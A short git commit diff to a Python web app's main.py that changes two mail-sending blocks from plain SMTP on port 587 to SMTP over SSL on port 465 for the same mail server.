c50005d7eaae4ad07d1480edb45bbe2af1a014fe
williams99-ox <williamsambrose99@gmail.com>
2025-03-07 00:08:22 +0100

    Update main.py

--- main.py
+++ main.py
@@ -210,7 +210,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("mail.businesstells.com", 587) as server:
+        with smtplib.SMTP_SSL("mail.businesstells.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
@@ -250,7 +250,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("mail.businesstells.com", 587) as server:
+        with smtplib.SMTP_SSL("mail.businesstells.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
